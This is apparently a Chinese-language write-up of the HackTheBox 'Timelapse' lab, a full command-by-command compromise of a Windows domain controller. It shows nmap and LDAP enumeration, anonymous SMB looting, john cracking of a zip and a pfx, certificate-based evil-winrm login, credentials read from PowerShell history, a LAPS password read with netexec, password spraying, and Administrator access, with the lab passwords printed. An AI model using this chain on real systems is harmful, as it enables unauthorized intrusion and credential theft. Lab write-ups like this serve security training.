对目标服务器进行了对应的端口扫描

```
sudo nmap -p- --min-rate 10000 10.10.11.152
```

![image-20241023154500952](https://files.seeusercontent.com/2026/04/07/Vuv7/image-20241023154500952.png)

对开放端口进行进一步的扫描工作

```
sudo nmap -p53,88,135,139,389,445,464,636,3268,3269,5986,9389,49667,49673,49674,49675,49724 -A 10.10.11.152 -oX timelapse.xml
```

![image-20241023154617063](https://files.seeusercontent.com/2026/04/07/Xz7h/image-20241023154617063.png)

根据nmap的扫描结果，优先添加hosts记录

```
10.10.11.152   timelapse.htb
10.10.11.152   dc01.timelapse.htb
```

接着优先针对ldap进行扫描

```
ldapsearch -x -b"DC=timelapse,DC=htb" -H ldap://10.10.11.152:389
ldapsearch -x -b"DC=timelapse,DC=htb" -H ldap://10.10.11.152:389
```

![image-20241023155041649](https://s2.loli.net/2024/10/23/l3pOQ6DbWnU8qtZ.png)

接着我们访问SMB服务

```
smbclient -L //10.10.11.152
smbclient -N //10.10.11.152/Shares
```

![image-20241023161131081](https://files.seeusercontent.com/2026/04/06/kA9u/image-20241023161131081.png)

将所有的内容进行下载

```
recurse ON
prompt OFF
mget *
```

这里递归下载会出现部分内容未下载的情况，需要手动进行补充下载，可能是因为网络原因，但还是建议下载前查看每个文件夹具体有哪些内容

![image-20241023161509362](https://files.seeusercontent.com/2026/04/07/Ft7j/image-20241023161509362.png)

dev文件夹中的zip文件被加密了，需要密码，内部包含了一个pfx文件

针对压缩包加密，我们使用相应工具获取对应加密hash，并对相应hash进行解密

```
zip2john winrm_backup.zip >hash
sudo john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![image-20241023165830935](https://s2.loli.net/2024/10/23/NwSYoD6KO8UkiPX.png)

解压获取到pfx文件，之前有尝试通过openssl将公司要合并为pfx，所以从pfx文件中提取公私钥也存在可行性，经过Google搜索，找到了这个文章可以进行参考（https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file）

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key
```

![image-20241023171414134](https://s2.loli.net/2024/10/23/dVe5Pyja7MKAHUL.png)

这时候提示需要密码，我们需要进一步对文件进行破解

```
pfx2john legacyy_dev_auth.pfx > legacyy_dev_auth.pfx.hash
sudo john legacyy_dev_auth.pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![image-20241023171658630](https://files.seeusercontent.com/2026/04/06/0jNt/image-20241023171658630.png)

获取到对应的密码，用于上述公私钥分解

![image-20241023172114082](https://s2.loli.net/2024/10/23/G7QVFbZsWTmn9qe.png)

需要输入的PEM密码，可以根据你自己的情况设定，我设定为和上述解密密码一致，简单好记

```
openssl pkcs12 -in legacyy_dev_auth.pfx  -clcerts -nokeys -out legacyy_dev_auth.crt
```

提取相应证书

```
openssl rsa -in legacyy_dev_auth.key -out legacyy_dev_auth_decrypted.key
```

针对相应key进行解密，密码输入上上步我们输入的内容

现在我们拥有了证书和密钥，可以通过这些进行登录

```
evil-winrm -i timelapse.htb -S -k legacyy_dev_auth_decrypted.key  -c legacyy_dev_auth.crt
```

![image-20241023174957678](https://s2.loli.net/2024/10/23/yxb1VjBktw7aes2.png)

接着我们查看powershell命令执行记录

```
cd C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

```

![image-20241023175248188](https://s2.loli.net/2024/10/23/tyreOhBU6GEQJbA.png)

我们看到相应的用户密码在设定认证信息

user：svc_deploy

pass：E3R$Q62^12p7PLlC%KWaxuaV

尝试进行登录

```
evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```

需要添加-S参数，启用SSL，不然会存在无法登录的情况

![image-20241023180135157](https://s2.loli.net/2024/10/23/DoaRw8MQpWqkXA5.png)

我们使用bloodhound-python对域环境进行信息收集

```
bloodhound-python -d 'timelapse.htb' -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -c all -ns 10.10.11.152
```

用户归属于LAPS_READERS组内，使用 LAPS，DC 管理域中计算机的本地管理员密码。通常创建一组用户并授予他们读取这些密码的权限，从而允许受信任的管理员访问所有本地管理员密码

所以我们尝试进行本地密码读取

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps

```
netexec ldap 10.10.11.152 -S -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' --kdcHost dc01.timelapse.htb -M laps
```

![image-20241023182537329](https://files.seeusercontent.com/2026/04/06/j6Nc/image-20241023182537329.png)

没有对应用户，我们将net user获取的所有用户制作成user.txt，进行爆破

```
netexec winrm 10.10.11.152 -u user.txt -p 'fhMTbbI6l$!;t9OQ@!CD8ZY0'
```

![image-20241023182621350](https://s2.loli.net/2024/10/23/O9tbrioN8SJj3XE.png)

发现就是administrator的密码，进行登录

```
user:Administrator
pass:fhMTbbI6l$!;t9OQ@!CD8ZY0

evil-winrm -i timelapse.htb -u Administrator -p 'fhMTbbI6l$!;t9OQ@!CD8ZY0' -S
```
